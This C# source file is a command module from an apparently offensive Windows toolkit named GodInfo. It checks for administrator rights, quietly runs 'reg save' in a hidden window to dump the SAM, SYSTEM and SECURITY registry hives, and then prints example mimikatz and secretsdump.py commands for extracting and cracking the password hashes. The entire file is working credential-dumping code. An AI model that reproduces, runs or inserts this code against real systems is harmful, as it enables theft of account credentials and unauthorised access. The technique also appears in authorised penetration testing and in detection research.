using GodInfo.Utils;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;

namespace GodInfo.Commands
{
    public class ExportSAMCommand : ICommand
    {
        public void Execute(List<string> args)
        {
            Logger.TaskHeader("Windows SAM Export", 1);
            
            // 检查是否具有管理员权限
            if (!CommonUtils.IsAdminRight())
            {
                Logger.WriteLine("[-] Administrator privileges required to export SAM files.");
                return;
            }
            
            string outputDirectory = args.Count > 0 ? args[0] : Logger.globalLogDirectory;
            
            if (!Directory.Exists(outputDirectory))
            {
                try
                {
                    Directory.CreateDirectory(outputDirectory);
                }
                catch (Exception ex)
                {
                    Logger.WriteLine($"[-] Failed to create output directory: {ex.Message}");
                    outputDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                    Logger.WriteLine($"[*] Using desktop as fallback: {outputDirectory}");
                }
            }
            
            Logger.WriteLine($"[*] Trying to export Windows password hashes...");
            Logger.WriteLine($"[*] Output directory: {outputDirectory}");
            
            // 导出 SYSTEM 文件
            string systemFilePath = Path.Combine(outputDirectory, "SystemBkup.hiv");
            bool systemResult = ExportRegistryHive("HKLM\\SYSTEM", systemFilePath);
            
            // 导出 SAM 文件
            string samFilePath = Path.Combine(outputDirectory, "SamBkup.hiv");
            bool samResult = ExportRegistryHive("HKLM\\SAM", samFilePath);
            
            // 导出 SECURITY 文件（可选，有助于破解某些类型的密码）
            string securityFilePath = Path.Combine(outputDirectory, "SecurityBkup.hiv");
            bool securityResult = ExportRegistryHive("HKLM\\SECURITY", securityFilePath);
            
            // 输出结果摘要
            Logger.WriteLine("\n[*] Export Summary:");
            Logger.WriteLine($"    System hive   : {(systemResult ? $"SUCCESS - {systemFilePath}" : "FAILED")}");
            Logger.WriteLine($"    SAM hive      : {(samResult ? $"SUCCESS - {samFilePath}" : "FAILED")}");
            Logger.WriteLine($"    Security hive : {(securityResult ? $"SUCCESS - {securityFilePath}" : "FAILED")}");
            
            if (systemResult && samResult)
            {
                Logger.WriteLine("\n[+] SAM and SYSTEM files exported successfully.");
                Logger.WriteLine("\n[*] These files can be used with mimikatz, hashcat or other password cracking tools:");
                Logger.WriteLine("    Example mimikatz command: lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv");
                Logger.WriteLine("    Example secretsdump: secretsdump.py -sam SamBkup.hiv -system SystemBkup.hiv LOCAL");
            }
            else
            {
                Logger.WriteLine("\n[-] Failed to export some required hives.");
            }
        }
        
        private bool ExportRegistryHive(string hivePath, string outputPath)
        {
            try
            {
                // 执行reg save命令
                Logger.WriteLine($"[*] Exporting {hivePath} to {outputPath}...");
                
                Process process = new Process();
                process.StartInfo.FileName = "reg.exe";
                process.StartInfo.Arguments = $"save {hivePath} \"{outputPath}\"";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                
                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();
                
                if (process.ExitCode == 0)
                {
                    Logger.WriteLine($"[+] Successfully exported {hivePath}");
                    return true;
                }
                else
                {
                    Logger.WriteLine($"[-] Failed to export {hivePath}: {error}");
                    return false;
                }
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error exporting {hivePath}: {ex.Message}");
                return false;
            }
        }
    }
} 